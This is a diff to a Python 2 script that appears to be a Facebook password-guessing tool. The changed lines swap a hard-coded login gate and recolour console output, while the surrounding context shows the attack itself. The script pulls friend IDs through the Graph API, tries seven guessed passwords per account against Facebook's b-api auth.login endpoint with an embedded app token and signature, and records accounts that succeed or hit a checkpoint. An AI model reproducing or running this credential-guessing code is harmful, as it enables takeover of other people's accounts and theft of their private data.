@@ -79,8 +79,8 @@ print  """
   \033[1;94m#########  ###     ### ###    #### ###########
 \033[1;94m------------------------\033[1;97m<>\033[1;94m------------------------\033[1;97m"""
 
-CorrectUsername = "Omi6t"
-CorrectPassword = "Omi"
+CorrectUsername = "Khulhet"
+CorrectPassword = "Dani"
 
 loop = 'true'
 while (loop == 'true'):
@@ -235,7 +235,7 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;94m-->\033[1;94mEnter ID: \033[1;97m")
+		idt = raw_input("\033[1;97m-->\033[1;94mEnter ID: \033[1;97m")
 		print "\033[1;94m------------------------\033[1;97m<>\033[1;94m------------------------"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
@@ -278,7 +278,7 @@ def pilih_super():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m.\x1b[1;97m-' + user + '-\x1b[1;92m.\x1b[1;97m-' + pass1
+				print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m.\x1b[1;97m-' + user + '-\x1b[1;94m.\x1b[1;97m-' + pass1
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
@@ -292,7 +292,7 @@ def pilih_super():
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
-						print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m.\x1b[1;97m-' + user + '-\x1b[1;92m.\x1b[1;97m-' + pass2
+						print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m.\x1b[1;97m-' + user + '-\x1b[1;94m.\x1b[1;97m-' + pass2
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
@@ -306,7 +306,7 @@ def pilih_super():
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m.\x1b[1;97m-' + user + '-\x1b[1;92m.\x1b[1;97m-' + pass3
+								print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m.\x1b[1;97m-' + user + '-\x1b[1;94m.\x1b[1;97m-' + pass3
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
@@ -320,7 +320,7 @@ def pilih_super():
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
-										print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m.\x1b[1;97m-' + user + '-\x1b[1;92m.\x1b[1;97m-' + pass4
+										print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m.\x1b[1;97m-' + user + '-\x1b[1;94m.\x1b[1;97m-' + pass4
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
@@ -334,7 +334,7 @@ def pilih_super():
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
-												print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m.\x1b[1;97m-' + user + '-\x1b[1;92m.\x1b[1;97m-' + pass5
+												print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m.\x1b[1;97m-' + user + '-\x1b[1;94m.\x1b[1;97m-' + pass5
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
@@ -348,7 +348,7 @@ def pilih_super():
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
-														print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m.\x1b[1;97m-' + user + '-\x1b[1;92m.\x1b[1;97m-' + pass6
+														print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m.\x1b[1;97m-' + user + '-\x1b[1;94m.\x1b[1;97m-' + pass6
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
@@ -364,7 +364,7 @@ def pilih_super():
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
-																print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;92m.\x1b[1;97m-' + user + '-\x1b[1;92m.\x1b[1;97m-' + pass7
+																print '\x1b[1;92mSuccessful\x1b[1;97m-\x1b[1;94m.\x1b[1;97m-' + user + '-\x1b[1;94m.\x1b[1;97m-' + pass7
 																oks.append(user+pass7)
 															else:
 																if 'www.facebook.com' in q["error_msg"]:
@@ -382,7 +382,7 @@ def pilih_super():
 	p.map(main, id)
 	print "\033[1;97m\033[1;94m------------------------\033[1;97m<>\033[1;94m------------------------"
 	print '\033[1;94mProcess Has Been Completed....'
-	print"\033[1;94mTotal \033[1;97mOK/\x1b[1;91mCP \033[1;97: \033[1;97m"+str(len(oks))+"\033[1;94m/\033[1;91m"+str(len(cekpoint))
+	print"\033[1;94mTotal \033[1;97mOK\033[1;94m/\x1b[1;91mCP \033[1;97: \033[1;97m"+str(len(oks))+"\033[1;94m/\033[1;91m"+str(len(cekpoint))
 	raw_input("\n\033[1;94mPress Enter to go Back")
 	menu()
 
